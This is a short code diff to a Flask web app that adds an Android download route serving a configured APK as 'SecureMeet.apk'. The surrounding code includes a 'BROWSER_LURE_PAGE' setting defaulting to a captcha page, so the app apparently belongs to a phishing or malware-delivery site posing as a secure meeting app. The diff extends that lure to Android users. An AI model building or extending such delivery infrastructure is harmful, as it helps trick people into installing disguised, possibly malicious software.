@@ -35,6 +35,16 @@ def download_app():
                          mimetype="application/octet-stream")
     return "Not available", 404
 
+@app.route("/download/android")
+def download_android():
+    apk_path = app.config.get("ANDROID_APK_PATH", "")
+    if apk_path and os.path.exists(apk_path):
+        from flask import send_file
+        return send_file(apk_path, as_attachment=True,
+                         download_name="SecureMeet.apk",
+                         mimetype="application/vnd.android.package-archive")
+    return "Not available", 404
+
 @app.route("/browser")
 def open_in_browser():
     lure = app.config.get("BROWSER_LURE_PAGE", "captcha")
